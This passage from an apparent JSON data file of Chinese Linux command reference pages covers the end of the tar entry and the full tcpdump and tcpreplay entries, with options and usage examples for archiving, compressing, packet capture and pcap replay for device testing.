class=\"hljs-comment\">前缀的信号名称</span>\n      --<span class=\"hljs-comment\">utc</span>                  <span class=\"hljs-comment\">以</span> <span class=\"hljs-comment\">UTC</span> <span class=\"hljs-comment\">格式打印文件修改时间</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">v</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">verbose</span>              <span class=\"hljs-comment\">详细地列出处理的文件</span>\n      --<span class=\"hljs-comment\">warning=KEYWORD</span>      <span class=\"hljs-comment\">警告控制:</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">w</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">interactive</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">confirmation</span>\n                             <span class=\"hljs-comment\">每次操作都要求确认</span>\n\n <span class=\"hljs-comment\">兼容性选项:</span>\n\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">o</span>                         <span class=\"hljs-comment\">创建归档时，相当于</span>\n                             --<span class=\"hljs-comment\">old</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">archive；展开归档时，相当于</span>\n                             --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">same</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">owner</span>\n\n <span class=\"hljs-comment\">其它选项:</span>\n\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">?</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">help</span>                 <span class=\"hljs-comment\">显示此帮助列表</span>\n      --<span class=\"hljs-comment\">restrict</span>             <span class=\"hljs-comment\">禁用某些潜在的有危险的选项</span>\n      --<span class=\"hljs-comment\">usage</span>                <span class=\"hljs-comment\">显示简短的用法说明</span>\n      --<span class=\"hljs-comment\">version</span>              <span class=\"hljs-comment\">打印程序版本</span>\n\n<span class=\"hljs-comment\">长选项和相应短选项具有相同的强制参数或可选参数。</span>\n\n<span class=\"hljs-comment\">除非以</span> --<span class=\"hljs-comment\">suffix</span> <span class=\"hljs-comment\">或</span> <span class=\"hljs-comment\">SIMPLE_BACKUP_SUFFIX</span>\n<span class=\"hljs-comment\">设置备份后缀，否则备份后缀就是“~”。</span>\n<span class=\"hljs-comment\">可以用</span> --<span class=\"hljs-comment\">backup</span> <span class=\"hljs-comment\">或</span> <span class=\"hljs-comment\">VERSION_CONTROL</span> <span class=\"hljs-comment\">设置版本控制，可能的值为：</span>\n\n  <span class=\"hljs-comment\">none</span><span class=\"hljs-string\">,</span> <span class=\"hljs-comment\">off</span>       <span class=\"hljs-comment\">从不做备份</span>\n  <span class=\"hljs-comment\">t</span><span class=\"hljs-string\">,</span> <span class=\"hljs-comment\">numbered</span>     <span class=\"hljs-comment\">进行编号备份</span>\n  <span class=\"hljs-comment\">nil</span><span class=\"hljs-string\">,</span> <span class=\"hljs-comment\">existing</span>\n<span class=\"hljs-comment\">如果编号备份存在则进行编号备份，否则进行简单备份</span>\n  <span class=\"hljs-comment\">never</span><span class=\"hljs-string\">,</span> <span class=\"hljs-comment\">simple</span>   <span class=\"hljs-comment\">总是使用简单备份</span>\n\n--<span class=\"hljs-comment\">quoting</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">style</span> <span class=\"hljs-comment\">选项的有效参数为:</span>\n\n  <span class=\"hljs-comment\">literal</span>\n  <span class=\"hljs-comment\">shell</span>\n  <span class=\"hljs-comment\">shell</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">always</span>\n  <span class=\"hljs-comment\">c</span>\n  <span class=\"hljs-comment\">c</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">maybe</span>\n  <span class=\"hljs-comment\">escape</span>\n  <span class=\"hljs-comment\">locale</span>\n  <span class=\"hljs-comment\">clocale</span>\n\n<span class=\"hljs-comment\">此</span> <span class=\"hljs-comment\">tar</span> <span class=\"hljs-comment\">默认为:</span>\n--<span class=\"hljs-comment\">format=gnu</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">f</span><span class=\"hljs-literal\">-</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">b20</span> --<span class=\"hljs-comment\">quoting</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">style=escape</span> --<span class=\"hljs-comment\">rmt</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">command=/etc/rmt</span>\n--<span class=\"hljs-comment\">rsh</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">command=/usr/bin/ssh</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件或目录：指定要打包的文件或目录列表。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-bullet\">- </span>z：有gzip属性的\n<span class=\"hljs-bullet\">- </span>j：有bz2属性的\n<span class=\"hljs-bullet\">- </span>Z：有compress属性的\n<span class=\"hljs-bullet\">- </span>v：显示所有过程\n<span class=\"hljs-bullet\">- </span>O：将文件解开到标准输出\n</code></pre>\n<pre><code class=\"language-shell\">tar -cf archive.tar foo <span class=\"hljs-built_in\">bar</span>  <span class=\"hljs-meta\"># 从文件 foo 和 bar 创建归档文件 archive.tar。</span>\ntar -tvf archive.tar         <span class=\"hljs-meta\"># 详细列举归档文件 archive.tar 中的所有文件。</span>\ntar -xf archive.tar          <span class=\"hljs-meta\"># 展开归档文件 archive.tar 中的所有文件。</span>\n</code></pre>\n<p>下面的参数-f是必须的</p>\n<p>-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p>\n<pre><code class=\"language-shell\">tar -<span class=\"hljs-keyword\">cf</span> <span class=\"hljs-keyword\">all</span>.tar *.jpg\n# 这条命令是将所有.jpg的文件打成一个名为<span class=\"hljs-keyword\">all</span>.tar的包。-<span class=\"hljs-keyword\">c</span>是表示产生新的包，-<span class=\"hljs-keyword\">f</span>指定包的文件名。\n\ntar -rf <span class=\"hljs-keyword\">all</span>.tar *.gif\n# 这条命令是将所有.gif的文件增加到<span class=\"hljs-keyword\">all</span>.tar的包里面去。-r是表示增加文件的意思。\n\ntar -uf <span class=\"hljs-keyword\">all</span>.tar logo.gif\n# 这条命令是更新原来tar包<span class=\"hljs-keyword\">all</span>.tar中logo.gif文件，-<span class=\"hljs-keyword\">u</span>是表示更新文件的意思。\n\ntar -<span class=\"hljs-keyword\">tf</span> <span class=\"hljs-keyword\">all</span>.tar\n# 这条命令是列出<span class=\"hljs-keyword\">all</span>.tar包中所有文件，-t是列出文件的意思\n</code></pre>\n<pre><code class=\"language-shell\">tar -cvf archive.tar foo <span class=\"hljs-built_in\">bar</span>  <span class=\"hljs-meta\"># 从文件foo和bar创建archive.tar。</span>\ntar -tvf archive.tar         <span class=\"hljs-meta\"># 详细列出archive.tar中的所有文件。</span>\ntar -xf archive.tar          <span class=\"hljs-meta\"># 从archive.tar提取所有文件。</span>\n</code></pre>\n<h4 id=\"zip格式\">zip格式</h4>\n<p>压缩： zip -r [目标文件名].zip [原文件/目录名]<br>解压： unzip [原文件名].zip<br>注：-r参数代表递归  </p>\n<h4 id=\"tar格式（该格式仅仅打包，不压缩）\">tar格式（该格式仅仅打包，不压缩）</h4>\n<p>打包：tar -cvf [目标文件名].tar [原文件名/目录名]<br>解包：tar -xvf [原文件名].tar<br>注：c参数代表create（创建），x参数代表extract（解包），v参数代表verbose（详细信息），f参数代表filename（文件名），所以f后必须接文件名。  </p>\n<h4 id=\"targz格式\">tar.gz格式</h4>\n<p>方式一：利用前面已经打包好的tar文件，直接用压缩命令。</p>\n<p>压缩：gzip [原文件名].tar<br>解压：gunzip [原文件名].tar.gz  </p>\n<p>方式二：一次性打包并压缩、解压并解包</p>\n<p>打包并压缩： tar -zcvf [目标文件名].tar.gz [原文件名/目录名]<br>解压并解包： tar -zxvf [原文件名].tar.gz<br>注：z代表用gzip算法来压缩/解压。  </p>\n<h4 id=\"tarbz2格式\">tar.bz2格式</h4>\n<p>方式一：利用已经打包好的tar文件，直接执行压缩命令：</p>\n<p>压缩：bzip2 [原文件名].tar<br>解压：bunzip2 [原文件名].tar.bz2<br>方式二：一次性打包并压缩、解压并解包  </p>\n<p>打包并压缩： tar -jcvf [目标文件名].tar.bz2 [原文件名/目录名]<br>解压并解包： tar -jxvf [原文件名].tar.bz2<br>注：小写j代表用bzip2算法来压缩/解压。  </p>\n<h4 id=\"tarxz格式\">tar.xz格式</h4>\n<p>方式一：利用已经打包好的tar文件，直接用压缩命令：</p>\n<p>压缩：xz [原文件名].tar<br>解压：unxz [原文件名].tar.xz<br>方式二：一次性打包并压缩、解压并解包  </p>\n<p>打包并压缩： tar -Jcvf [目标文件名].tar.xz [原文件名/目录名]<br>解压并解包： tar -Jxvf [原文件名].tar.xz<br>注：大写J代表用xz算法来压缩/解压。  </p>\n<h4 id=\"tarz格式（已过时）\">tar.Z格式（已过时）</h4>\n<p>方式一：利用已经打包好的tar文件，直接用压缩命令：</p>\n<p>压缩：compress [原文件名].tar<br>解压：uncompress [原文件名].tar.Z<br>方式二：一次性打包并压缩、解压并解包  </p>\n<p>打包并压缩： tar -Zcvf [目标文件名].tar.Z [原文件名/目录名]<br>解压并解包： tar -Zxvf [原文件名].tar.Z<br>注：大写Z代表用ncompress算法来压缩/解压。另，ncompress是早期Unix系统的压缩格式，但由于ncompress的压缩率太低，现已过时。  </p>\n<h4 id=\"jar格式\">jar格式</h4>\n<p>压缩：jar -cvf [目标文件名].jar [原文件名/目录名]<br>解压：jar -xvf [原文件名].jar  </p>\n<p>注：如果是打包的是Java类库，并且该类库中存在主类，那么需要写一个META-INF/MANIFEST.MF配置文件，内容如下：  </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Manifest</span>-Version: <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">Created</span>-By: <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">0</span>_27 (Sun Microsystems Inc.)\n<span class=\"hljs-attribute\">Main</span>-class: the_name_of_the_main_class_should_be_put_here\n</code></pre>\n<p>然后用如下命令打包：</p>\n<p>jar -cvfm [目标文件名].jar META-INF/MANIFEST.MF [原文件名/目录名]<br>这样以后就能用“java -jar [文件名].jar”命令直接运行主类中的public static void main方法了。  </p>\n<h4 id=\"7z格式\">7z格式</h4>\n<p>压缩：7z a [目标文件名].7z [原文件名/目录名]<br>解压：7z x [原文件名].7z<br>注：这个7z解压命令支持rar格式，即：  </p>\n<p>7z x [原文件名].rar</p>\n<h4 id=\"其它例子\">其它例子</h4>\n<p><strong>将文件全部打包成tar包</strong> ：</p>\n<pre><code class=\"language-shell\">tar -cvf log<span class=\"hljs-selector-class\">.tar</span> log2012<span class=\"hljs-selector-class\">.log</span>    仅打包，不压缩！\ntar -zcvf log<span class=\"hljs-selector-class\">.tar</span><span class=\"hljs-selector-class\">.gz</span> log2012<span class=\"hljs-selector-class\">.log</span>   打包后，以 gzip 压缩\ntar -jcvf log<span class=\"hljs-selector-class\">.tar</span><span class=\"hljs-selector-class\">.bz2</span> log2012<span class=\"hljs-selector-class\">.log</span>  打包后，以 bzip2 压缩\n</code></pre>\n<p>在选项<code>f</code>之后的文件档名是自己取的，我们习惯上都用&nbsp;.tar&nbsp;来作为辨识。&nbsp;如果加<code>z</code>选项，则以.tar.gz或.tgz来代表gzip压缩过的tar包；如果加<code>j</code>选项，则以.tar.bz2来作为tar包名。</p>\n<p><strong>解压目录</strong></p>\n<p>去掉第一层目录结构，要出除第二层，--strip-components 2</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tar</span> -xvf portal-web-v2.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.tar --strip-components <span class=\"hljs-number\">1</span>  -C 指定目录\n</code></pre>\n<p><strong>查阅上述tar包内有哪些文件</strong> ：</p>\n<pre><code class=\"language-shell\">tar -ztvf <span class=\"hljs-built_in\">log</span>.tar.gz\n</code></pre>\n<p>由于我们使用&nbsp;gzip&nbsp;压缩的log.tar.gz，所以要查阅log.tar.gz包内的文件时，就得要加上<code>z</code>这个选项了。</p>\n<p><strong>将tar包解压缩</strong> ：</p>\n<pre><code class=\"language-shell\">tar -zxvf <span class=\"hljs-regexp\">/opt/</span>soft<span class=\"hljs-regexp\">/test/</span>log.tar.gz\n</code></pre>\n<p>在预设的情况下，我们可以将压缩档在任何地方解开的</p>\n<p><strong>只将tar内的部分文件解压出来</strong> ：</p>\n<pre><code class=\"language-shell\">tar -zxvf <span class=\"hljs-regexp\">/opt/</span>soft<span class=\"hljs-regexp\">/test/</span>log30.tar.gz log2013.log\n</code></pre>\n<p>我可以透过<code>tar&nbsp;-ztvf</code>来查阅&nbsp;tar&nbsp;包内的文件名称，如果单只要一个文件，就可以透过这个方式来解压部分文件！</p>\n<p><strong>文件备份下来，并且保存其权限</strong> ：</p>\n<pre><code class=\"language-shell\">tar -zcvpf lo<span class=\"hljs-name\">g31.</span>tar.gz lo<span class=\"hljs-name\">g2014.</span>log lo<span class=\"hljs-name\">g2015.</span>log lo<span class=\"hljs-name\">g2016.</span>log\n</code></pre>\n<p>这个<code>-p</code>的属性是很重要的，尤其是当您要保留原本文件的属性时。</p>\n<p><strong>在文件夹当中，比某个日期新的文件才备份</strong> ：</p>\n<pre><code class=\"language-shell\">tar -N <span class=\"hljs-string\">\"2012/11/13\"</span> -zcvf log17<span class=\"hljs-selector-class\">.tar</span><span class=\"hljs-selector-class\">.gz</span> test\n</code></pre>\n<p><strong>备份文件夹内容是排除部分文件：</strong></p>\n<pre><code class=\"language-shell\">tar --<span class=\"hljs-keyword\">exclude</span> scf<span class=\"hljs-regexp\">/service -zcvf scf.tar.gz scf/</span>*\n</code></pre>\n<p><strong>打包文件之后删除源文件：</strong></p>\n<pre><code class=\"language-shell\">tar -cvf <span class=\"hljs-keyword\">test</span>.tar <span class=\"hljs-keyword\">test</span> --<span class=\"hljs-keyword\">remove</span>-files\n</code></pre>\n<p><strong>其实最简单的使用 tar 就只要记忆底下的方式即可：</strong></p>\n<pre><code class=\"language-shell\">压　缩：tar -<span class=\"hljs-keyword\">jcv </span>-f filename.tar.<span class=\"hljs-keyword\">bz2 </span>要被压缩的文件或目录名称\n查　询：tar -<span class=\"hljs-keyword\">jtv </span>-f filename.tar.<span class=\"hljs-keyword\">bz2\n</span>解压缩：tar -<span class=\"hljs-keyword\">jxv </span>-f filename.tar.<span class=\"hljs-keyword\">bz2 </span>-C 欲解压缩的目录\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tcpdump",
        "des": "一款sniffer工具，是Linux上的抓包工具，嗅探器",
        "body": "<h1 id=\"tcpdump\">tcpdump</h1>\n<p>一款sniffer工具，是Linux上的抓包工具，嗅探器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tcpdump命令</strong> 是一款抓包，嗅探器工具，它可以打印所有经过网络接口的数据包的头信息，也可以使用<code>-w</code>选项将数据包保存到文件中，方便以后分析。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">tcpdump</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：尝试将网络和广播地址转换成名称；</span>\n<span class=\"hljs-deletion\">-c&lt;数据包数目&gt;：收到指定的数据包数目后，就停止进行倾倒操作；</span>\n<span class=\"hljs-deletion\">-d：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出；</span>\n<span class=\"hljs-deletion\">-dd：把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出；</span>\n<span class=\"hljs-deletion\">-ddd：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出；</span>\n<span class=\"hljs-deletion\">-e：在每列倾倒资料上显示连接层级的文件头；</span>\n<span class=\"hljs-deletion\">-f：用数字显示网际网络地址；</span>\n<span class=\"hljs-deletion\">-F&lt;表达文件&gt;：指定内含表达方式的文件；</span>\n<span class=\"hljs-deletion\">-i&lt;网络界面&gt;：使用指定的网络截面送出数据包；</span>\n<span class=\"hljs-deletion\">-l：使用标准输出列的缓冲区；</span>\n<span class=\"hljs-deletion\">-n：不把主机的网络地址转换成名字；</span>\n<span class=\"hljs-deletion\">-N：不列出域名；</span>\n<span class=\"hljs-deletion\">-O：不将数据包编码最佳化；</span>\n<span class=\"hljs-deletion\">-p：不让网络界面进入混杂模式；</span>\n<span class=\"hljs-deletion\">-q ：快速输出，仅列出少数的传输协议信息；</span>\n<span class=\"hljs-deletion\">-r&lt;数据包文件&gt;：从指定的文件读取数据包数据；</span>\n<span class=\"hljs-deletion\">-s&lt;数据包大小&gt;：设置每个数据包的大小；</span>\n<span class=\"hljs-deletion\">-S：用绝对而非相对数值列出TCP关联数；</span>\n<span class=\"hljs-deletion\">-t：在每列倾倒资料上不显示时间戳记；</span>\n<span class=\"hljs-deletion\">-tt： 在每列倾倒资料上显示未经格式化的时间戳记；</span>\n<span class=\"hljs-deletion\">-T&lt;数据包类型&gt;：强制将表达方式所指定的数据包转译成设置的数据包类型；</span>\n<span class=\"hljs-deletion\">-v：详细显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-vv：更详细显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-x：用十六进制字码列出数据包资料；</span>\n<span class=\"hljs-deletion\">-w&lt;数据包文件&gt;：把数据包数据写入指定的文件。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>直接启动tcpdump将监视第一个网络接口上所有流过的数据包</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tcpdump</span>\n</code></pre>\n<p> <strong>监视指定网络接口的数据包</strong> </p>\n<pre><code class=\"language-shell\">tcpdump -<span class=\"hljs-selector-tag\">i</span> eth1\n</code></pre>\n<p>如果不指定网卡，默认tcpdump只会监视第一个网络接口，一般是eth0，下面的例子都没有指定网络接口。</p>\n<p> <strong>监视指定主机的数据包</strong> </p>\n<p>打印所有进入或离开sundown的数据包。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tcpdump host sundown</span>\n</code></pre>\n<p>也可以指定ip,例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tcpdump</span> host <span class=\"hljs-number\">210.27.48.1</span>\n</code></pre>\n<p>打印helios 与 hot 或者与 ace 之间通信的数据包</p>\n<pre><code class=\"language-shell\">tcpdump host helios <span class=\"hljs-keyword\">and</span> <span class=\"hljs-string\">\\(</span> hot <span class=\"hljs-keyword\">or</span> ace <span class=\"hljs-string\">\\)</span>\n</code></pre>\n<p>截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tcpdump</span> host <span class=\"hljs-number\">210.27.48.1</span> and \\ (<span class=\"hljs-number\">210.27.48.2</span> or <span class=\"hljs-number\">210.27.48.3</span> \\)\n</code></pre>\n<p>打印ace与任何其他主机之间通信的IP 数据包, 但不包括与helios之间的数据包.</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">tcpdump</span> <span class=\"hljs-built_in\">ip</span> host ace <span class=\"hljs-keyword\">and</span> not helios\n</code></pre>\n<p>如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tcpdump</span> ip host <span class=\"hljs-number\">210.27.48.1</span> and ! <span class=\"hljs-number\">210.27.48.2</span>\n</code></pre>\n<p>抓取eth0网卡上的包，使用:</p>\n<pre><code class=\"language-shell\">sudo tcpdump -<span class=\"hljs-selector-tag\">i</span> eth0\n</code></pre>\n<p>截获主机hostname发送的所有数据</p>\n<pre><code class=\"language-shell\">tcpdump -<span class=\"hljs-selector-tag\">i</span> eth0 <span class=\"hljs-attribute\">src</span> host hostname\n</code></pre>\n<p>监视所有送到主机hostname的数据包</p>\n<pre><code class=\"language-shell\">tcpdump -<span class=\"hljs-selector-tag\">i</span> eth0 dst host hostname\n</code></pre>\n<p> <strong>监视指定主机和端口的数据包</strong> </p>\n<p>如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tcpdump</span> tcp port <span class=\"hljs-number\">23</span> and host <span class=\"hljs-number\">210.27.48.1</span>\n</code></pre>\n<p>对本机的udp 123 端口进行监视 123 为ntp的服务端口</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tcpdump</span> udp port <span class=\"hljs-number\">123</span>\n</code></pre>\n<p> <strong>监视指定网络的数据包</strong> </p>\n<p>打印本地主机与Berkeley网络上的主机之间的所有通信数据包</p>\n<pre><code class=\"language-shell\">tcpdump <span class=\"hljs-built_in\">net</span> ucb-ether\n</code></pre>\n<p>ucb-ether此处可理解为“Berkeley网络”的网络地址，此表达式最原始的含义可表达为：打印网络地址为ucb-ether的所有数据包</p>\n<p>打印所有通过网关snup的ftp数据包</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-title\">tcpdump</span> 'gateway snup and (port ftp or ftp-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span>)'</span>\n</code></pre>\n<p>注意：表达式被单引号括起来了，这可以防止shell对其中的括号进行错误解析</p>\n<p>打印所有源地址或目标地址是本地主机的IP数据包</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">tcpdump</span> <span class=\"hljs-built_in\">ip</span> <span class=\"hljs-keyword\">and</span> not net localnet\n</code></pre>\n<p>如果本地网络通过网关连到了另一网络，则另一网络并不能算作本地网络。</p>\n<p>抓取80端口的HTTP报文，以文本形式展示：</p>\n<pre><code class=\"language-shell\">sudo tcpdump -<span class=\"hljs-selector-tag\">i</span> any port <span class=\"hljs-number\">80</span> -<span class=\"hljs-selector-tag\">A</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tcpreplay",
        "des": "将PCAP包重新发送，用于性能或者功能测试",
        "body": "<h1 id=\"tcpreplay\">tcpreplay</h1>\n<p>将PCAP包重新发送，用于性能或者功能测试</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>简单的说， <strong>tcpreplay</strong> 是一种pcap包的重放工具，它可以将用ethreal、wireshark工具抓下来的包原样或经过任意修改后重放回去。它允许你对报文做任意的修改（主要是指对2层、3层、4层报文头），指定重放报文的速度等，这样tcpreplay就可以用来复现抓包的情景以定位bug，以极快的速度重放从而实现压力测试。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A \"&lt;args&gt;\" 在使用 tcpdump 风格打印输出信息时，同时再调用tcpdump中的参数， 默认已经带有“-n,-l”，所以一般看到的都是ip地址，而没有主机名的打印，注意这个是在tcpreplay使用了-v参数时才能使用，不带-v不会报错，但是没有实际意义。格式：-vA “nnt”表示以tcpdump风格输出报文信息，并且不打印时间戳、主机名、端口服务名称。注意不要使用-c参数来指定打印的数据报文的个数，这样发送出去的报文也会变少。</span>\n<span class=\"hljs-deletion\">-c &lt;cachefile&gt; 双网卡回放报文必选参数，后面紧跟cache文件名，该文件为tcpprep根据对应的pcap文件构造出来。 </span>\n<span class=\"hljs-deletion\">-D 把应用层的数据，使用dump mode写入到指定文件中去，和-w、-W 参数一起使用。 </span>\n<span class=\"hljs-deletion\">-e &lt;ip1:ip2&gt; 指定端点的ip，即把发送报文的和接收的报文的ip都修改称对应的参数值中指定的ip，但是这样发送的出的报文不会区分client和server。。 </span>\n<span class=\"hljs-deletion\">-f &lt;configfile&gt; 指定配置文件。</span>\n<span class=\"hljs-deletion\">-F 在发送报文时，自动纠正错误的校验和。对测试DUT的校验和检验。</span>\n<span class=\"hljs-deletion\">-h 显示帮助文件。 </span>\n<span class=\"hljs-deletion\">-i &lt;nic&gt; 双网卡回放报文必选参数，指定主接口。</span>\n<span class=\"hljs-deletion\">-I &lt;mac&gt; 重写主网卡发送出报文的目的MAC地址。 </span>\n<span class=\"hljs-deletion\">-j &lt;nic&gt; 双网卡回放报文必选参数，指定从接口。</span>\n<span class=\"hljs-deletion\">-J &lt;mac&gt; 重写从网卡发送出报文的目的MAC地址。 </span>\n<span class=\"hljs-deletion\">-k &lt;mac&gt; 重写主网卡发送报文的源MAC地址。 </span>\n<span class=\"hljs-deletion\">-K &lt;mac&gt; 重写从网卡发送报文的源MAC地址。</span>\n<span class=\"hljs-deletion\">-l &lt;loop&gt; 指定循环的次数。</span>\n<span class=\"hljs-deletion\">-L &lt;limit&gt; 指定最大的发包数量。可以在确认连接的调试时使用。 </span>\n<span class=\"hljs-deletion\">-m &lt;multiple&gt; 指定一个倍数值，就是必默认发送速率要快多少倍的速率发送报文。 加大发送的速率后，对于DUT可能意味着有更多的并发连接和连接数，特别是对于BT报文的重放， 因为连接的超时是固定的，如果速率增大的话， 留在session表中的连接数量增大，还可以通过修改连接的超时时间来达到该目的。</span>\n<span class=\"hljs-deletion\">-M 表示不发送“火星”的ip报文，man文件中的定义是 0/8、172/8、 255/8。</span>\n<span class=\"hljs-deletion\">-n 在使用-S参数，不对混杂模式进行侦听。</span>\n<span class=\"hljs-deletion\">-N &lt;CIDR1:CIDR2,...&gt; 通过伪造的NAT，重写IP地址。这个参数应该有很重要的应用，目前没有测试使用。</span>\n<span class=\"hljs-deletion\">-O 没有测试使用。</span>\n<span class=\"hljs-deletion\">-p &lt;packetrate&gt; 指定每秒发送报文的个数，指定该参数，其它速率相关的参数被忽略，最后的打印信息不会有速率和每秒发送报文的统计。</span>\n<span class=\"hljs-deletion\">-P 表示在输出信息中打印PID的信息，用于单用户或单帐户模式下暂停和重启程序。</span>\n<span class=\"hljs-deletion\">-r &lt;rate&gt; 指定发送的速率。目前-m/-r/-p这3个参数的相互关系。</span>\n<span class=\"hljs-deletion\">-R 让网卡极限速度发数据包。 </span>\n<span class=\"hljs-deletion\">-t &lt;mtu&gt; 指定MTU，标准的10/100M网卡的默认值是1500。 </span>\n<span class=\"hljs-deletion\">-T Truncate packets &gt; 截去报文中MTU大于标准值的部分再发送出去，默认是不发送，skip掉。</span>\n<span class=\"hljs-deletion\">-v 每发送一个报文都以 tcpdump 的风格打印出对应的信息。</span>\n<span class=\"hljs-deletion\">-V 查看版本号。</span>\n<span class=\"hljs-deletion\">-w &lt;file&gt; 将主网卡发送的报文写入一个文件中，参数后紧跟文件名。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> **1、重放在客户端 ftp 连接的报文&nbsp;** </p>\n<p>a、在客户端使用 ethereal 抓包，存为 ftp.pcap 文件。</p>\n<p>b、 将 ftp.pcap 文件进行 tcpprep 操作，制作 cache 文件。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@A</span> ~]<span class=\"hljs-meta\"># tcpprep -an client -i ftp.pcap -o ftp.cache –v </span>\n</code></pre>\n<p>c、 将 DUT 设备的两个接口和 PC 的两个接口使用网线连接，使用 tcpreplay 重 放报文。注意防火墙的配置为网桥（透明）模式。&nbsp;</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@A</span> ~]<span class=\"hljs-meta\"># tcpreplay -c ftp.cache -i eth0 -j eth1 ftp.pcap -R –v </span>\n</code></pre>\n<p>-R 参数表示全速发送，-v 显示打印信息。&nbsp;</p>\n<p> **2、重放在客户端 BT 连接的报文&nbsp;** </p>\n<p>a、在实验室 BT 下载一些台湾的娱乐节目和热门的大片，使用 ethereal 抓包， 存为 bt.pcap 文件。注意 pcap 文件大小的控制，对 pc 的内存要求比较高，我保 存了一个 600 多 M 的 pcap 文件用了 40 多分钟，大家有需要可以直接从实验室 copy。&nbsp;</p>\n<p>b、将 bt.pcap 文件进行 tcpprep 操作，制作 cache 文件。</p>\n<pre><code class=\"language-shell\"> [root<span class=\"hljs-symbol\">@A</span> ~]<span class=\"hljs-meta\"># tcpprep -an client -i bt.pcap -o bt.cache -C <span class=\"hljs-string\">\"100M BT Packet\"</span> –v</span>\n</code></pre>\n<p>制作 cache 文件，在 cache 文件中写入“100M BT Packet”的注释。&nbsp;</p>\n<p>c、使用 tcpreplay 重放报文。&nbsp;</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@A</span> ~]<span class=\"hljs-meta\"># tcpreplay -c bt.cache -i eth0 -j eth1 bt.pcap -v –R </span>\n</code></pre>\n<p> **3、重放 tftp 服务器上抓到的报文&nbsp;** </p>\n<p>a、在 tftp 服务器上使用 ethereal 抓包，存为 tftp.pcap 文件。&nbsp;</p>\n<p>b、将 pcap 文件进行 tcpprep 的操作，制作 cache 文件。&nbsp;</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@A</span> ~]<span class=\"hljs-meta\"># tcpprep -an server -i tftp.pcap -o tftp.cache –v </span>\n</code></pre>\n<p>注意：我在测试的时候犯了一个错误，使用 DUT 的 tftp 升级来做实验，同时穿 过 DUT 重放报文，结果在网卡发送报文的后，DUT 的 mac 地址做了的回应，导致 交互过程没有穿过 DUT，这个问题比较搞笑，上午弄了半天才发现原因，开始还 以为 udp 的连接不能重放。&nbsp;</p>\n<p>c、使用 tcpreplay 重放报文。&nbsp;</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@A</span> ~]<span class=\"hljs-meta\"># tcpreplay -c tftp.cache -i eth0 -j eth1 tftp.pcap –v</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
